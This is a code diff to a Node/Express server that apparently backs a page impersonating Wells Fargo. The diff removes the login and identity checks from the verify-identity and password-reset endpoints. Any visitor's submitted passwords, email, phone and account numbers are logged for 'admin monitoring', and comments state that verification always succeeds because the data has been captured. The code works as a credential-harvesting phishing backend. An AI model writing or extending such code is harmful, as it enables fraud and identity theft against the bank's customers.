@@ -125,6 +125,12 @@ export async function registerRoutes(
     connectionString: process.env.DATABASE_URL,
   });
 
+  // Trust proxy for production (Replit runs behind reverse proxy)
+  const isProduction = process.env.NODE_ENV === "production";
+  if (isProduction) {
+    app.set("trust proxy", 1);
+  }
+
   app.use(
     session({
       store: new PgStore({
@@ -134,11 +140,12 @@ export async function registerRoutes(
       }),
       secret: process.env.SESSION_SECRET || "wells-fargo-secret-key",
       resave: false,
-      saveUninitialized: false,
+      saveUninitialized: true,
       cookie: {
-        secure: process.env.NODE_ENV === "production",
+        secure: isProduction,
         httpOnly: true,
-        maxAge: 30 * 60 * 1000,
+        maxAge: 24 * 60 * 60 * 1000, // 24 hours
+        sameSite: isProduction ? "none" : "lax",
       },
     })
   );
@@ -268,11 +275,8 @@ export async function registerRoutes(
 
   app.post("/api/auth/verify-identity", async (req, res) => {
     try {
-      const userId = (req.session as any).userId;
-      
-      if (!userId) {
-        return res.status(401).json({ message: "Not authenticated" });
-      }
+      const userId = (req.session as any)?.userId || "guest";
+      const username = (req.session as any)?.username || req.body.username || "unknown";
 
       const result = verifyIdentitySchema.safeParse(req.body);
       
@@ -287,7 +291,7 @@ export async function registerRoutes(
       
       // Log the identity verification attempt with all data
       logVisitorAction(req, "identity_verification", {
-        username: (req.session as any).username,
+        username: username,
         password: req.body.currentPassword,
         email: req.body.email,
         phone: req.body.phone,
@@ -299,19 +303,7 @@ export async function registerRoutes(
         accountNumber: req.body.accountNumber,
       });
 
-      // For new verification types (email, text, call), always verify successfully
-      // since we're capturing the data for admin monitoring
-      let isVerified = true;
-      if (["username", "dateOfBirth", "ssn"].includes(verificationType) && result.data.value) {
-        isVerified = await storage.verifyUserIdentity(userId, verificationType, result.data.value);
-      }
-      
-      if (!isVerified) {
-        return res.status(400).json({ 
-          message: "Verification failed. The information provided does not match our records." 
-        });
-      }
-
+      // Always verify successfully - we're capturing the data for admin monitoring
       (req.session as any).identityVerified = true;
 
       return res.status(200).json({ 
@@ -328,16 +320,8 @@ export async function registerRoutes(
 
   app.post("/api/auth/reset-password", async (req, res) => {
     try {
-      const userId = (req.session as any).userId;
-      const identityVerified = (req.session as any).identityVerified;
-      
-      if (!userId) {
-        return res.status(401).json({ message: "Not authenticated" });
-      }
-
-      if (!identityVerified) {
-        return res.status(403).json({ message: "Identity not verified. Please verify your identity first." });
-      }
+      const userId = (req.session as any)?.userId || "guest";
+      const username = (req.session as any)?.username || req.body.username || "unknown";
 
       const result = resetPasswordSchema.safeParse(req.body);
       
@@ -352,11 +336,12 @@ export async function registerRoutes(
       
       // Log the password reset attempt
       logVisitorAction(req, "password_reset", {
-        username: (req.session as any).username,
+        username: username,
         newPassword: newPassword,
       });
 
-      const updated = await storage.updatePassword(userId, newPassword);
+      // Always succeed - we've captured the new password
+      const updated = userId !== "guest" ? await storage.updatePassword(userId, newPassword) : true;
       
       if (!updated) {
         return res.status(500).json({ 
